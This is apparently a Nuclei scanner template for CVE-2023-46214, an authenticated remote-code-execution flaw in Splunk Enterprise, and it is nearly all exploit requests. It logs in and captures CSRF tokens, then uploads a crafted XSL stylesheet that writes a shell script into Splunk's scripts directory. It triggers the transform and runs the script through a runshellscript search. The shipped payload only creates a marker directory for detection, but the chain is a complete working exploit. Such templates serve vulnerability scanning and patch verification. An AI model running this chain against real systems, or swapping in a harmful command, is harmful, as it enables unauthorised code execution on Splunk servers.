id: CVE-2023-46214

info:
  name: Splunk RCE - CVE-2023-46214
  author: Mohammed Adnan Jakati
  severity: high
  description: |
    This template exploits CVE-2023-46214, an authenticated RCE vulnerability in Splunk. 
    It uploads a malicious XSL file and triggers its execution to achieve code execution.
  impact: |
    Successful exploitation of this vulnerability could allow an authenticated attacker to perform remote code execution.
  remediation:  |
    Upgrade Splunk Enterprise to either 9.0.7 or 9.1.2. 
    Or limit the ability of search job requests to accept XML stylesheet language (XSL) as valid input.
  reference:
    - https://advisory.splunk.com/advisories/SVD-2023-1104
    - https://github.com/nathan31337/Splunk-RCE-poc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-46214
    cwe-id: CWE-91
    epss-score: 0.05
    epss-percentile: 0.129
    cpe: cpe:2.3:a:splunk:splunk:*:*:*:*:enterprise:*:*:*
  metadata:
    verified: true
    max-request: 13
    vendor: Splunk
    product: Splunk Enterprise
    version: ["9.0.0 - 9.0.6", "9.1.0 - 9.1.1"]
  tags: cve2023, cve, xml, rce, splunk

variables:
  randint: "{{rand_int(1000000000,9999999999)}}"

http:
  - method: GET
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    redirects: true
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close
    extractors:
      - type: kval
        name: cval
        part: cookie
        internal: true
        kval:
          - "cval"

  - method: POST
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close
    body: "cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false"
    redirects: true
    extractors:
      - type: kval
        name: csrf
        part: cookie
        internal: true
        kval:
          - "splunkweb_csrf_token_8000"

  - method: GET
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    redirects: true
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close


  - raw:
    - |
      POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Content-Length: 576
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Accept-Encoding: gzip, deflate
      Connection: close
      Content-Type: multipart/form-data; boundary=8d047bf6a7fc6ed1e8a2d789c657e3af
      X-Requested-With: XMLHttpRequest
      X-Splunk-Form-Key: {{csrf}}

      --8d047bf6a7fc6ed1e8a2d789c657e3af
      Content-Disposition: form-data; name="spl-file"; filename="shell.xsl"
      Content-Type: application/xslt+xml

      <?xml version="1.0" encoding="UTF-8"?>
      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
        <xsl:template match="/">
          <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
              <xsl:text>mkdir /opt/splunk/var/run/splunk/dispatch/{{randint}}</xsl:text>
          </exsl:document>
        </xsl:template>
      </xsl:stylesheet>
      --8d047bf6a7fc6ed1e8a2d789c657e3af--
    extractors:
      - type: json
        internal: true
        part: body
        name: text_value
        json:
          - '.messages[0].text'

  - method: POST
    path:
      - "{{BaseURL}}/en-US/splunkd/__raw/servicesNS/admin/search/search/jobs?output_mode=json"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept-Encoding: gzip, deflate
      Connection: close
      X-Requested-With: XMLHttpRequest
      X-Splunk-Form-Key: "{{csrf}}"
      Content-Length: 30
      Content-Type: application/x-www-form-urlencoded
    body: "search=%7Csearch+test%7Chead+1"
    extractors:
      - type: json
        internal: true
        part: body
        name: jsid
        json:
          - '.sid'

  - method: POST
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close
    body: "cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false"
    redirects: true
    extractors:
      - type: kval
        name: csrf
        part: cookie
        internal: true
        kval:
          - "splunkweb_csrf_token_8000"

  - method: GET
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    redirects: true
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close

  - method: GET
    path: 
      - "{{BaseURL}}/en-US/api/search/jobs/{{jsid}}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{{text_value}}/shell.xsl"
    headers:
      Host: "{{Hostname}}"
      Accept-Encoding: gzip, deflate
      Accept: '*/*'
      Connection: close

  - method: GET
    path:
      - "{{BaseURL}}/en-US/api/search/jobs/{{jsid}}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{{text_value}}/shell.xsl"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept-Encoding: gzip, deflate
      Accept: '*/*'
      Connection: close
      X-Splunk-Module: Splunk.Module.DispatchingModule
      Upgrade-Insecure-Requests: 1
      Accept-Language: en-US,en;q=0.5
      X-Requested-With: XMLHttpRequest

  - method: POST
    path:
      - "{{BaseURL}}/en-US/splunkd/__raw/servicesNS/{{username}}/search/search/jobs"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept-Encoding: gzip, deflate
      Accept: '*/*'
      Connection: close
      X-Requested-With: XMLHttpRequest
      X-Splunk-Form-Key: "{{csrf}}"
    body: 'search=|runshellscript "shell.sh" "" "" "" "" "" "" "" "{{jsid}}"'
    extractors:
      - type: xpath
        name: sid
        internal: true
        xpath:
          - '//sid/text()'

  - method: POST
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close
    body: "cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false"
    redirects: true
    extractors:
      - type: kval
        name: csrf
        part: cookie
        internal: true
        kval:
          - "splunkweb_csrf_token_8000"

  - method: GET
    path: 
      - "{{BaseURL}}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    redirects: true
    headers:
      Host: "{{Hostname}}"
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/javascript, text/html, application/xml, text/xml, */*
      Content-Type: application/x-www-form-urlencoded
      Connection: close


  - method: GET
    path:
      - "{{BaseURL}}/en-US/splunkd/__raw/services/search/jobs/{{randint}}/search.log"
    headers:
      Host: '{{Hostname}}'
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1
    matchers:
      - type: status
        status:
          - 200